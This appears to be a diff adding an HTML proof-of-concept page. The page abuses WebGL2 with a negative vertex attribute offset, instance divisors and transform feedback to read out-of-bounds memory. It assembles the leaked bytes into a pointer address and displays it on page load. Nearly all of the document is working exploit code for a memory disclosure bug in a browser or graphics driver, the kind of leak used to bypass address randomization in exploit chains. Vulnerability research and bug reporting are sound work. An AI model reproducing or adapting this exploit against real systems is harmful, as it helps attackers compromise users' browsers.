@@ -1,0 +1,124 @@
+<html>
+
+<head>
+    <script type="text/javascript">
+        function printHexBytes(array) {
+            return Array.from(array).map(byte => (byte & 0xff).toString(16).padStart(2, '0')).join(' ');
+        }
+
+        function trigger() {
+            var canvas = document.getElementById('canvas');
+            var gl = canvas.getContext('webgl2');
+
+            var vShader = gl.createShader(gl.VERTEX_SHADER);
+            var vShaderScript = document.getElementById('vshader');
+            const vShaderSource = `#version 300 es
+            in vec4 vPosition;
+            in vec2 texCoord0;
+            out vec2 texCoord;
+            out vec4 feedbackPosition;
+            void main() {
+                gl_Position = vPosition;
+                texCoord = texCoord0;
+                feedbackPosition = vPosition;
+            }`;
+
+
+            gl.shaderSource(vShader, vShaderSource);
+            gl.compileShader(vShader);
+
+            var fShader = gl.createShader(gl.FRAGMENT_SHADER);
+            const fShaderSource = `#version 300 es
+            precision mediump float;
+            void main() {
+                
+            }`;
+
+            gl.shaderSource(fShader, fShaderSource);
+            gl.compileShader(fShader);
+
+            var program = gl.createProgram();
+            gl.attachShader(program, vShader);
+            gl.attachShader(program, fShader);
+
+            const varyings = ["feedbackPosition"];
+            gl.transformFeedbackVaryings(program, varyings, gl.SEPARATE_ATTRIBS);
+
+            gl.linkProgram(program);
+            gl.useProgram(program);
+
+            const buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            var data = new Uint8Array([1, 1, 0, 1, 1, 0, 1, 1, 0]);
+            gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW, 0, 3);
+
+            //const vao = gl.createVertexArray();
+            //gl.bindVertexArray(vao);
+
+
+            var rloc = gl.getAttribLocation(program, "vPosition");
+            console.log("rloc:", rloc);
+            var pointer = -8;
+            gl.vertexAttribPointer(rloc, 2, gl.BYTE, false, 2, pointer);
+
+            // =================================
+            gl.enableVertexAttribArray(rloc);
+            gl.vertexAttribDivisor(rloc, 2);
+
+            //gl.drawArraysInstanced(gl.TRIANGLES, 0, 3, 20);
+            /// =================================
+            // Set up transform feedback
+            const tfBuffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, tfBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, 0x1000, gl.STREAM_READ);
+
+            const tf = gl.createTransformFeedback();
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
+            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, tfBuffer);
+
+            // Draw with transform feedback
+            gl.enable(gl.RASTERIZER_DISCARD); // Disable rasterization as we don't need to draw
+
+            gl.useProgram(program);
+            // gl.bindVertexArray(vao);
+            gl.beginTransformFeedback(gl.TRIANGLES);
+            gl.drawArraysInstanced(gl.TRIANGLES, 0, 3, 8);
+            gl.endTransformFeedback();
+
+            gl.disable(gl.RASTERIZER_DISCARD);
+
+            // Read back the data
+            const feedbackData = new Float32Array(0x100);
+            gl.bindBuffer(gl.ARRAY_BUFFER, tfBuffer);
+            gl.getBufferSubData(gl.ARRAY_BUFFER, 0, feedbackData);
+            let hexString = printHexBytes(feedbackData);
+
+            // console.log(" after reading feedbackData: ", hexString);
+
+            let leak_array = new Uint32Array(8);
+            let j = 0;
+            for (let i = 0; i < 8; i += 2) {
+
+                leak_array[i] = feedbackData[j];
+                leak_array[i + 1] = feedbackData[j + 1];
+
+                j += 24;
+            }
+
+            let leaked_addr = BigInt(0);
+            for (let i = 0; i < 8; i++) {
+                leaked_addr += BigInt(leak_array[i] & 0xFF) << BigInt(i * 8);
+            }
+
+            // console.log("leak_array: ", printHexBytes(leak_array));
+            // console.log("leak_addr: 0x" + leaked_addr.toString(16));
+            alert("leak_addr: 0x" + leaked_addr.toString(16));
+        }
+    </script>
+</head>
+
+<body onload="trigger();">
+    <canvas id="canvas" width="1024" height="1024"></canvas>
+</body>
+
+</html>
